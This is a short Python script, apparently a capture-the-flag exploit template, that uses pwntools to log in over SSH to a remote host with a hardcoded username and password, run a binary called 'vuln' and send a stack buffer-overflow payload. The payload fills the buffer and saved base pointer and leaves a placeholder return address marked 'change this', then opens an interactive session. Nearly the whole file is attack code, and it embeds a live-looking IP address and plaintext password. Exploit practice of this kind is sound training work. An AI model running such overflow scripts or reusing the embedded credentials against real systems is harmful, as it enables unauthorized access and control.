from pwn import *
import sys

binary = "./vuln"
ssh_host = "3.112.30.17"
ssh_port = 22
ssh_user = "rwpl"
ssh_password = "Rwpl_Sup3r_s3cr3t_p4ssw0rd"

elf = ELF(binary)
context.binary = binary
context.log_level = "debug"

ssh = ssh(host=ssh_host, user=ssh_user, password=ssh_password, port=ssh_port)
p = ssh.process(binary)

p.recvuntil(b"Please input your string: ")

payload = b''
payload += b'A' * 0x100 # buf
payload += b'B' * 0x8 # saved rbp
payload += b'C' * 0x8 # change this.

p.sendline(payload)

sleep(1)
p.interactive()